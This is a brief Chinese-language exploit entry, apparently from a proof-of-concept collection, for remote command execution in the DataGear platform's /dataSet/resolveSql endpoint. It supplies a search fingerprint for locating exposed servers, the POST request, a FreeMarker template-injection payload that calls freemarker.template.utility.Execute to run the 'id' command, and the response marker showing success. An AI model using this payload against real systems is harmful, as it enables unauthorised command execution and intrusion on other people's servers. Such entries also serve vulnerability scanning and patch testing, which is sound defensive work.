# DataGear平台resolveSql存在远程代码执行漏洞

DataGear ｜ 命令执行 ｜ —
- **指纹**：`body="changeThemeData?theme="`
- **请求**：`POST /dataSet/resolveSql HTTP/1.1`

**Payload**
```
{"sql": "<#assign value='freemarker.template.utility.Execute'?new()>${value('id')}"}
```
- **响应特征**：200 uid=